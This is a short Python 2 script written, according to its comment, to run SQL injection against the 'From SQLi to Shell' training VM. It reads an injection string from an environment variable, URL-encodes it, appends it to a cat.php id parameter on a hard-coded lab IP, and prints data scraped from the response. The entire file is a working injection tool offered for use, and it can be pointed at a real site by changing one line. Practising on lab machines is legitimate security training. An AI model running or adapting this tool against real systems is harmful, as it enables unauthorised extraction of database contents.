#!/usr/bin/python

#This program is used for SQLi in "From SQLi to Shell" B2R VM

import urllib, sys, urllib2, re, os

ip = "10.11.1.105" #Change this

def encode(injection):
    ''' URL encode the argument (SQL injection)'''
    injection = urllib.quote_plus(injection)
    return str(injection)

def webconnection(url):
    ''' Send the SQL payload to the server and print
    the response'''
    opener = urllib2.build_opener()
    source_code = urllib2.urlopen(url).read()
    extract = re.findall('Picture: (.*)', source_code)
    for string in extract:
        print string[:-5]

def usage():
    ''' Self explanatory'''
    print "%s environment_var" % (sys.argv[0])
    print "Eg. $ export command=\"injection_here\"\n\t$ python %s command" % (sys.argv[0])
    sys.exit()

def main():
    if len(sys.argv)!=2:
        usage()
    else:
        if (os.getenv(sys.argv[1]) == None):
            print "Please set some value to the environment variable"
            usage()
        url = "http://"+ip+"/cat.php?id=-1%20"+encode(str(os.getenv(sys.argv[1])))
        webconnection(url)

if __name__ == '__main__':
    main()
